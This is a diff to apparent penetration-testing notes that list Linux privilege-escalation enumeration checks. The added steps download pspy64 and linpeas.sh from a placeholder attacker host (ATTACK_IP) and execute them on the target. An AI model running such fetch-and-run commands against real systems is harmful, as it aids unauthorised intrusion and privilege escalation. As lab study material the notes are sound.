@@ -56,7 +56,7 @@ On a linux machine, we can do some checks to see if we can exploit them to do la
 
 1) Sudo privileges (Authenticated)
 
-           sudo -l
+       sudo -l
 
 2) SUID bit files
 
@@ -65,5 +65,24 @@ On a linux machine, we can do some checks to see if we can exploit them to do la
 3) Open ports/services/applications within the machine
 
         ss -tulpn
-           netstat -ano
+        netstat -ano
 
+4) Check for running processes either as root, or as another target user for lateral movement
+
+        wget http://ATTACK_IP:PORT/pspy64
+
+        chmod +x ./pspy64
+
+        ./pspy64
+
+5) Check detailed contents of a directory like hidden files, file size, ownership
+
+        ls -lah
+
+6) Automated Enumeration
+
+        wget http://ATTACK_IP:PORT/linpeas.sh
+
+        chmod +x ./linpeas.sh
+
+        ./linpeas.sh
